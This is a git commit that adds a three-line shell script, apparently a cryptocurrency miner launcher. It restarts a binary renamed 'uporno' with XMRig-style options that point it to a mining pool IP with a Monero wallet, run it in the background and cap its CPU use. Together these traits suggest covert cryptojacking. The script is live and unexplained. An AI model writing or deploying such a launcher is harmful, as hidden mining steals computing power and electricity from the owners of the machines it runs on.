183053f3102a37c92f3db0be29adc72ee7c60655
duplo1 <46064321+duplo1@users.noreply.github.com>
2019-04-18 22:29:12 +0300

    Add files via upload

---
+++ 50.sh
@@ -0,0 +1,3 @@
+pkill uporno
+sleep 7
+uporno -o 95.216.136.239:2658 -u 4A1mQPFXPsf66zbKtTCXbPbeuBjyoSdLG4L1KdtM1KniNukmSr3SQFkcs7z9dBUMTedGGR9vEhqSQYRnhdZeNAg82WBHkmG --pass=12:koot@usa.com --rig-id=012 -B --donate-level=0 --print-time=30 --threads=$THREADS --cpu-priority=4 --background --max-cpu-usage=47 --av=1 --variant -1
